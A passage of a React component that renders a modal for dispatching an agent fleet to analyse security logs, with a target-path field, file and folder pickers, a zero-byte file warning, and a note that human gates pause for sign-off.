        style={{ maxWidth: "620px", width: "95%" }}
        role="dialog"
        aria-modal="true"
        aria-labelledby="run-mission-title"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="wizard-head">
          <span style={{ display: "flex", alignItems: "center", gap: "6px" }}>
            <Play size={13} color="#236f66" /> DISPATCH FLEET EXECUTION
          </span>
          <button className="icon-button" aria-label="Close" onClick={onClose}>
            <X size={18} />
          </button>
        </div>

        <h2 id="run-mission-title" style={{ fontSize: "17px", margin: "6px 0 2px", color: "#162f29" }}>
          {mission.name}
        </h2>
        <p className="wizard-desc" style={{ marginBottom: "16px" }}>
          Configure target directory or attach files/folder. Attaching files is completely optional.
        </p>

        <div className="wizard-fields" style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
          <label style={{ display: "flex", flexDirection: "column", gap: "6px", fontSize: "11px", fontWeight: 700, color: "#253b35" }}>
            <span>Target directory or local path (Optional)</span>
            <input
              type="text"
              value={targetPath}
              onChange={(e) => setTargetPath(e.target.value)}
              placeholder="e.g. D:\Security-logs-test\attack-cases-benchmark\case-1-apt-enterprise-intrusion\raw-logs"
              style={{
                padding: "8px 12px",
                fontSize: "11px",
                border: "1px solid #c9d8d1",
                borderRadius: "5px",
                background: "#ffffff",
                color: "#162a26",
                outline: "none",
                fontFamily: "var(--font-geist-mono), monospace",
              }}
            />
            <small style={{ color: "#6a7c76", fontWeight: 400, fontSize: "10px" }}>
              Specialist agents will inspect this local directory path directly using terminal tools.
            </small>
          </label>

          <div style={{ background: "#f8faf9", border: "1px solid #dce8e2", borderRadius: "6px", padding: "12px 14px" }}>
            <span style={{ display: "block", fontSize: "11px", fontWeight: 700, color: "#253b35", marginBottom: "8px" }}>
              Attach files or folder (Optional)
            </span>

            <input
              type="file"
              ref={fileInputRef}
              multiple
              accept=".log,.txt,.json,.csv,.audit,.evtx,.xml,.yaml,.yml,.conf,.cfg,.sh,.py,.md,.docx,.pdf,.raw,.pcap,text/*"
              style={{ display: "none" }}
              onChange={handleFileChange}
            />

            <input
              type="file"
              ref={folderInputRef}
              {...({ webkitdirectory: "", directory: "" } as Record<string, unknown>)}
              style={{ display: "none" }}
              onChange={handleFolderChange}
            />

            <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", alignItems: "center" }}>
              <button
                type="button"
                className="secondary-button"
                style={{ fontSize: "11px", padding: "6px 12px", display: "inline-flex", alignItems: "center", gap: "5px" }}
                onClick={() => fileInputRef.current?.click()}
              >
                <FileText size={13} color="#236f66" /> Select Log / Text Files
              </button>

              <button
                type="button"
                className="secondary-button"
                style={{ fontSize: "11px", padding: "6px 12px", display: "inline-flex", alignItems: "center", gap: "5px" }}
                onClick={() => folderInputRef.current?.click()}
              >
                <Folder size={13} color="#236f66" /> Select Entire Folder
              </button>

              {selectedFiles.length > 0 && (
                <button
                  type="button"
                  style={{ border: 0, background: "transparent", color: "#a84e22", fontSize: "11px", cursor: "pointer", textDecoration: "underline" }}
                  onClick={() => setSelectedFiles([])}
                >
                  Clear files ({selectedFiles.length})
                </button>
              )}
            </div>

            {selectedFiles.length > 0 ? (
              <div style={{ marginTop: "10px", display: "flex", flexDirection: "column", gap: "6px" }}>
                {selectedFiles.map((f, idx) => {
                  const isZero = f.size === 0;
                  return (
                    <div
                      key={idx}
                      style={{
                        background: isZero ? "#fdf2f2" : "#ffffff",
                        border: isZero ? "1px solid #f5c2c7" : "1px solid #cce0d8",
                        borderRadius: "4px",
                        padding: "6px 10px",
                        fontSize: "11px",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        color: isZero ? "#842029" : "#195d56",
                      }}
                    >
                      <span style={{ fontWeight: 600 }}>{f.name}</span>
                      <span style={{ fontSize: "10px", color: isZero ? "#dc3545" : "#557a70", fontWeight: isZero ? 700 : 400 }}>
                        {isZero ? "⚠️ 0 BYTES (EMPTY FILE ON DISK)" : `${(f.size / 1024).toFixed(1)} KB (${f.size.toLocaleString()} bytes)`}
                      </span>
                    </div>
                  );
                })}
                {selectedFiles.some((f) => f.size === 0) && (
                  <p style={{ margin: "2px 0 0", color: "#dc3545", fontSize: "10.5px", fontWeight: 600 }}>
                    ⚠️ Your selected file has 0 bytes on disk. If it is open in Microsoft Word, please press <strong>Ctrl+S</strong> to save it, or choose a document with saved content.
                  </p>
                )}
              </div>
            ) : (
              <div style={{ marginTop: "6px", fontSize: "10px", color: "#778a84" }}>
                Accepts all log &amp; text formats: .log, .txt, .json, .evtx, .audit, .csv, .xml, .yaml, .conf, .md, .docx, or an entire directory.
              </div>
            )}
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: "8px", background: "#f2f7f4", padding: "8px 12px", borderRadius: "5px", border: "1px solid #dbe8e1" }}>
            <BadgeCheck size={14} color="#236f66" />
            <span style={{ fontSize: "10.5px", color: "#23554b" }}>
              Execution runs on AgentHub host runtime. Human gates pause in <strong>Decision rooms</strong> for sign-off.
            </span>
          </div>
        </div>

        <div className="wizard-foot" style={{ marginTop: "18px", display: "flex", justifyContent: "flex-end", gap: "8px" }}>
          <button type="button" className="plain-button" onClick={onClose} disabled={isExecuting}>
            Cancel
          </button>
          <button
            type="button"
            className="primary-button"
            style={{ display: "inline-flex", alignItems: "center", gap: "6px", padding: "7px 16px" }}
            onClick={() => void onExecute({ targetPath, files: selectedFiles })}
            disabled={isExecuting || selectedFiles.some((f) => f.size === 0)}
          >
            {isExecuting ? (
              <>
                <RefreshCw size={13} className="spin" /> Dispatching...
              </>
            ) : selectedFiles.some((f) => f.size === 0) ? (
              "File is 0 bytes (Empty)"
            ) : (
              <>
                <Play size={13} /> Run Fleet Now
              </>
            )}
          </button>
        </div>
      </section>
    </div>
  );
}

